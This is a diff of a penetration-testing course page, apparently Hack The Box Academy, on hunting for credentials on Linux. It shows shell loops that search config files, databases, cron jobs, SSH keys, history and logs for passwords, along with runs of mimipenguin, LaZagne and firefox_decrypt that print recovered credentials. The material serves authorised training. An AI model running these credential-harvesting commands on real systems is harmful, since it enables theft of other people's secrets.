@@ -7,13 +7,15 @@
 // Module Difficulty: Medium
 // Section ID: 1320
 // Section Title: Credential Hunting in Linux
-// Page Title: Password Attacks
+// Page Title: Hack The Box - Academy
 // Page Number: 11
 -->
 
 # Credential Hunting in Linux
 
 **Module Name:** Password Attacks **Page Number:** 11
+
+#### 
 
 #### PASSWORD ATTACKS
 
@@ -23,7 +25,7 @@
 
 #### Configuration Files
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
 
 File extension:  .conf
@@ -63,7 +65,7 @@ File extension:  .cnf
 
 #### Credentials in Configuration Files
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
 
 File:  /snap/core18/2128/etc/ssl/openssl.cnf
@@ -94,7 +96,7 @@ File:  /etc/mysql/conf.d/mysql.cnf
 
 #### Databases
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
 
 DB File extension:  .sql
@@ -136,7 +138,7 @@ DB File extension:  .db*
 
 #### Notes
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
 
 /home/cry0l1t3/.config/caja/desktop-metadata
@@ -149,7 +151,7 @@ cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
 
 #### Scripts
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
 
 File extension:  .py
@@ -181,7 +183,7 @@ File extension:  .sh
 
 #### Cronjobs
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ cat /etc/crontab 
 
 # /etc/crontab: system-wide crontab
@@ -204,7 +206,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
 ```
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ ls -la /etc/cron.*/
 
 /etc/cron.d/:
@@ -230,7 +232,7 @@ drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
 
 #### SSH Private Keys
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
 
 /home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
@@ -238,7 +240,7 @@ cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
 
 #### SSH Public Keys
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
 
 /home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK
@@ -248,7 +250,7 @@ cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
 
 #### Bash History
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*
 
 ==> /home/cry0l1t3/.bash_history <==
@@ -268,7 +270,7 @@ fi
 
 #### Logs
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
 
 #### Log file:  /var/log/dpkg.log.1
@@ -287,7 +289,7 @@ cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "acc
 
 #### Memory - Mimipenguin
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
 [sudo] password for cry0l1t3: 
 
@@ -303,7 +305,7 @@ MimiPenguin Results:
 
 #### Memory - LaZagne
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all
 
 |====================================================================|
@@ -339,14 +341,14 @@ elapsed time = 3.50091600418
 
 #### Firefox Stored Credentials
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 
 
 drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
 drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
 ```
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 
 {
@@ -377,8 +379,8 @@ cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json
 
 #### Decrypting Firefox Credentials
 
-```shell-session
-[!bash!]$ python3.9 firefox_decrypt.py
+``` shell-session
+ndefstathiou@htb[/htb]$ python3.9 firefox_decrypt.py
 
 Select the Mozilla profile you wish to decrypt
 1 -> lfx3lvhb.default
@@ -397,7 +399,7 @@ Password: 'FzXUxJemKm6g2lGh'
 
 #### Browsers - LaZagne
 
-```shell-session
+``` shell-session
 cry0l1t3@unixclient:~$ python3 laZagne.py browsers
 
 |====================================================================|
